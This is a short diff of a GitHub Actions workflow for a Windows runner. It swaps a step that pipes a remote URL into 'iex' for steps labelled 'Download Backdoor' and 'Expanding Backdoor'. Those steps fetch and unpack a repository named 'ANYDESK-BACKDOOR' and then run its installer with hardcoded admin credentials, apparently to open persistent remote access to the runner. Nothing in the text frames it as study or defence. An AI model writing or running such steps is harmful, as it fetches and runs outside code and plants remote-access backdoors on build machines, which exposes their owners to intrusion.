@@ -4,9 +4,9 @@ jobs:
   build:
     runs-on: windows-latest
     steps:
-    - name: Download
-      run: Powershell -irm https://github.com/AiGptCode/ANYDESK-BACKDOOR.git | iex
-    - name: Extract
+    - name: Download Backdoor
+      run: Invoke-WebRequest -Uri 'https://github.com/MrAli-Code/ANYDESK-BACKDOOR/archive/refs/heads/main.zip' -OutFile 'ANYDESK-BACKDOOR-main.zip'
+    - name: Expanding Backdoor
       run: Expand-Archive ANYDESK-BACKDOOR-main.zip
     - name: Auth
       run: .\Install-AnyDesk.ps1 -InstallPath "C:\CustomPath" -AdminUsername "myadmin" -AdminPassword "mypassword"
